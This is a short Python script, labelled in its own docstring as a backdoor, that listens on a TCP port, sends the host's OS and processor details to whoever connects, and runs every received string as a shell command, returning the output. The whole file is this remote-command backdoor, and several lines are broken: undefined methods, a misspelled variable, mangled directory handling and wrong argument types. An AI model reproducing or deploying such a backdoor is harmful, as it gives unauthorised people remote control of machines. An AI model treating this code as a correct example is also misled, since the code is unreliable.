"""🐍 grabber target OS info (as a abackdoor)

Keyword arguments:
argument -- description
Input: 
Return: return_description
"""

import socket
import os
import platform
import sys
import subprocess

SRV_ADDR = "127.0.0.1"
SRV_PORT = 44444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)  # ? sspecifies max num of queued connections.
print("Server started! Waiting for connections...")

# ? conn -> socket obj used to send/rec data, address -> client add bound to the socket.
connection, address = s.accept()
print('Client connected with address:', address)


"""
The output of platform.system() is as follows:
    Linux: Linux
    Mac: Darwin
    Windows: Windows
"""
# ? Send Platform data
plt = platform.system()

if plt == "Windows":
    connection.sendall(b'Your system is Windows\n')
    # do x y z
elif plt == "Linux":
    connection.sendall(b'Your system is Linux')
    uname = os.uname().encode('utf-8')
    connection.sendall(f"{uname}")

elif plt == "Darwin":
    connection.sendall(b"Your system is MacOS")
    uname = os.uname().encode('utf-8')
    connection.sendall(f"{uname}")
else:
    unknown_plt = f"Unidentified system which's is {plt}".encode("utf-8")
    print(f"{unkoen_plt}")


connection.sendall(f"plt = {platform.platform()}\n".encode('utf-8'))
connection.sendall(f"processor = {platform.processor()}\n".encode('utf-8'))

# ? excute commands
while True:
    data = connection.recv(1024)

    if not data:
        break
    if data.decode().strip() == "disconnect":
        connection.close()
        break
    if data.decode().strip() == "exit":
        connection.close()
        break

    if data.decode()[:2] == "cd":
        command = data.decode()[:-1]
        working_dir = data.decode()[2:5]
        op = subprocess.Popen(command, stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE, shell=True, cwd=working_dir)

    command = data.decode()[:-1]

    op = subprocess.Popen(command, stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, shell=True)
    output, errors = op.communicate()  # This already encapsulates .wait()

    if op:
        connection.sendall(str(output.decode()).encode('utf-8'))
        connection.sendall(b'\n$ ')
    else:
        error = str(op.stderr.read())
        connection.sendall(b"Error: ", error.encode('utf-8'))

connection.close()
